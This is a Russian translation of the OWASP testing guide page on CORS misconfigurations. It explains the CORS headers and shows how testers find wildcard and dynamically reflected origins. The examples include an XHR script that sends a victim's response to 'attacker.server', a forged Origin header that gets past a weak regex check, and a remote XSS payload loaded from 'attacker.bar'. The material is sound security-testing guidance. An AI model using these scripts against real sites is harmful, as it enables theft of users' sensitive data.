---

layout: col-document
title: WSTG - Latest
tags: WSTG

---

{% include breadcrumb.html %}
# Тестирование Cross Origin Resource Sharing (CORS)

|ID          |
|------------|
|WSTG-CLNT-07|

## Обзор

Совместное использование ресурсов между источниками (англ.: [Cross Origin Resource Sharing](https://ru.wikipedia.org/wiki/Cross-origin_resource_sharing), CORS) — это механизм, позволяющий web-браузеру контролируемым образом делать междоменные запросы с помощью API XMLHttpRequest (XHR) уровня 2 (L2). Ранее API XHR L1 позволял отправлять запросы только в пределах одного источника, поскольку это было ограничено Политикой одного источника (англ.: [Same Origin Policy](https://developer.mozilla.org/ru/docs/Web/Security/Same-origin_policy), SOP).

Междоменные запросы имеют заголовок `Origin`, который указывает на домен, инициировавший запрос, и всегда передаётся на сервер. CORS определяет протокол между браузером и сервером, чтобы знать, разрешён ли запрос из другого источника. Для этого используются [HTTP-заголовки](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing#Headers).

[Спецификация CORS в стандарте Fetch](https://fetch.spec.whatwg.org/) предписывает, чтобы для запросов, отличных от GET или POST, или в которых используются учётные данные, сначала отправлялся предварительный (англ.: pre-flight) запрос OPTIONS, чтобы проверить, не окажет ли тип запроса негативного влияния на данные. Предварительный запрос проверяет методы и заголовки, разрешённые сервером, разрешены ли учётные данные. На основе результата запроса OPTIONS браузер решает, допустим ли запрос.

### Origin и Access-Control-Allow-Origin

Заголовок запроса `Origin` всегда отправляется браузером в запросе CORS и указывает на источник запроса. Его нельзя изменить с помощью JavaScript, т.к. [браузер блокирует его модификацию](https://developer.mozilla.org/ru/docs/Glossary/Forbidden_header_name); тем не менее, полагаться на этот заголовок для проверки контроля доступа — не лучшая идея, поскольку его можно подделать за пределами браузера, например, с помощью HTTP-прокси, поэтому необходимо проверить, используются ли для защиты чувствительной информации протоколы на уровне приложений.

`Access-Control-Allow-Origin` — заголовок ответа, используемый сервером для указания доменов, которым разрешено читать ответ. В соответствии со спецификацией CORS на основании этого заголовка клиент должен определить и применять ограничения.

С точки зрения тестирования следует искать небезопасные конфигурации, например, использующие символ подстановки `*` в качестве значения заголовка `Access-Control-Allow-Origin`, что означает, разрешение читать ответ любым доменам. Другой небезопасный пример — когда сервер возвращает заголовок источника без дополнительных проверок, что может привести к доступу к чувствительным данным. Обратите внимание, что конфигурация разрешения междоменных запросов очень небезопасна и  в целом неприемлема, за исключением случая публичного API, доступного для всех.

### Access-Control-Request-Method и Access-Control-Allow-Method

Заголовок `Access-Control-Request-Method` используется, когда браузер выполняет предварительный запрос OPTIONS и позволяет клиенту указать итоговый метод запроса. С другой стороны, `Access-Control-Allow-Method` — заголовок ответа, используемый сервером для описания разрешённых клиентам методов.

### Access-Control-Request-Headers и Access-Control-Allow-Headers

Эти два заголовка используются между браузером и сервером, чтобы определить, какие заголовки можно использовать для выполнения междоменного запроса.

### Access-Control-Allow-Credentials

Этот заголовок ответа позволяет браузерам читать ответ при передаче учётных данных. При отправке заголовка web-приложение должно установить для источника значение заголовка `Access-Control-Allow-Origin`. Заголовок `Access-Control-Allow-Credentials` *нельзя* использовать вместе с заголовком `Access-Control-Allow-Origin`, значением которого является подстановочный символ `*`, как показано ниже:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

### Контроль входных данных

XHR L2 предоставляет возможность создания междоменного запроса с использованием XHR API для обратной совместимости. Это может привести к уязвимостям, которых не было в XHR L1. Интересными для эксплуатации являются URL, которые передаются в XMLHttpRequest без валидации, особенно если разрешены абсолютные URL, поскольку это может привести к инъекции кода. Ещё одним аспектом приложения, который можно эксплуатировать, является то, что данные ответа не экранируются, и мы можем контролировать их, предоставляя вводимые пользователем данные.

### Другие заголовки

Существуют и другие заголовки, такие как `Access-Control-Max-Age`, который определяет время, в течение которого предварительный запрос может кэшироваться в браузере, или `Access-Control-Expose-Headers`, который указывает, какие заголовки безопасно предоставлять API по спецификации CORS API.

Описание заголовков CORS см. в [документе MDN по CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#The_HTTP_response_headers).

## Задачи тестирования

- Найти точки входа, реализующие CORS.
- Убедиться, что конфигурация CORS безопасна.

## Как тестировать

Инструмент, например, [ZAP](https://www.zaproxy.org), даёт возможность перехватывать заголовки HTTP, показывающие как работает CORS. Тестировщики должны обратить особое внимание на заголовок `origin`, чтобы узнать, какие домены разрешены. Кроме того, в некоторых случаях требуется ручная проверка JavaScript, чтобы определить, уязвим ли он для инъекции кода из-за некорректной обработки введённых пользователем данных.

### Небезопасная конфигурация CORS

Указание подстановочного символа в заголовке `Access-Control-Allow-Origin header` (т.е. `Access-Control-Allow-Origin: *`) небезопасно, если ответ содержит чувствительную информацию. Хотя его нельзя применять вместе с `Access-Control-Allow-Credentials: true`, это может быть опасно, если контроль доступа обеспечивается без аутентификации, исключительно за счёт правил межсетевого экрана или IP-адресов источника.

#### Произвольный Access-Control-Allow-Origin

Тестировщик может проверить, присутствует ли `Access-Control-Allow-Origin: *` в сообщениях HTTP-ответов.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 4
Content-Type: application/xml

[тело ответа]
```

Если ответ содержит чувствительные данные, злоумышленник может украсть их с помощью XHR:

```html
<html>
    <head></head>
    <body>
        <script>
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (this.readyState == 4 && this.status == 200) {
                    var xhr2 = new XMLHttpRequest();
                    // attacker.server: attacker listener чтобы украсть ответ
                    xhr2.open("POST", "http://attacker.server", true);
                    xhr2.send(xhr.responseText);
                }
            };
            // victim.site: vulnerable server с заголовком `Access-Control-Allow-Origin: *` 
            xhr.open("GET", "http://victim.site", true);
            xhr.send();
        </script>
    </body>
</html>
```

#### Динамическая политика CORS

Современное web-приложение или API могут быть реализованы c динамическим разрешением междоменных запросов, как правило, для запросов из поддоменов, подобно следующему:

```php
if (preg_match('|\.example.com$|', $_SERVER['SERVER_NAME'])) {
   header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
   ...
}
```

В этом примере будут разрешены все запросы с поддоменов `example.com`.  Необходимо убедиться, что регулярное выражение для сопоставления проверяется полностью. В противном случае, если оно будет просто сопоставлено с `example.com` (без `$`), злоумышленники могли бы обойти политику CORS, добавив свой домен к заголовку `Origin`.

```http
GET /test.php HTTP/1.1
Host: example.com
[...]
Origin: http://example.com.attacker.com
Cookie: <сессионный cookie>
```

При отправке вышеуказанного запроса, если с `Access-Control-Allow-Origin` возвращается ответ, значение которого совпадает с введённым злоумышленником, то злоумышленник может впоследствии прочитать ответ и получить доступ к чувствительной информации, доступной только пользователю-жертве.

```http
HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: http://example.com.attacker.com
Access-Control-Allow-Credentials: true
Content-Length: 4
Content-Type: application/xml

[тело ответа]
```

### Недостаточный контроль входных данных

Принципы CORS можно рассматривать под совершенно другим углом. Злоумышленник может умышленно разрешить своей политикой CORS инъекцию кода в целевое web-приложение.

#### Удалённый XSS с CORS

Этот код делает запрос к ресурсу, указанному после символа `#` в URL, который первоначально использовался для чтения ресурсов на том же сервере.

Уязвимый код:

```html
<script>
    var req = new XMLHttpRequest();

    req.onreadystatechange = function() {
        if(req.readyState==4 && req.status==200) {
            document.getElementById("div1").innerHTML=req.responseText;
        }
    }

    var resource = location.hash.substring(1);
    req.open("GET",resource,true);
    req.send();
</script>

<body>
    <div id="div1"></div>
</body>
```

Например, запрос, подобный этому, покажет содержимое файла `profile.php`:

`http://example.foo/main.php#profile.php`

Запрос и ответ, созданные `http://example.foo/profile.php`:

```http
GET /profile.php HTTP/1.1
Host: example.foo
[...]
Referer: http://example.foo/main.php
Connection: keep-alive

HTTP/1.1 200 OK
[...]
Content-Length: 25
Content-Type: text/html

[тело ответа]
```

Теперь, когда валидации URL нет, мы можем вставить удалённый скрипт, который будет вставлен и выполнен в контексте домена `example.foo` со следующим URL:

```text
http://example.foo/main.php#http://attacker.bar/file.php
```

Запрос и ответ, созданные `http://attacker.bar/file.php`:

```http
GET /file.php HTTP/1.1
Host: attacker.bar
[...]
Referer: http://example.foo/main.php
origin: http://example.foo

HTTP/1.1 200 OK
[...]
Access-Control-Allow-Origin: *
Content-Length: 92
Content-Type: text/html

[Контент, вставленный с attacker.bar]: <img src="#" onerror="alert('Domain: '+document.domain)">
```

## Ссылки

- [Раздел CORS в памятке OWASP по защите HTML5](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing)
- [MDN Cross-Origin Resources Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
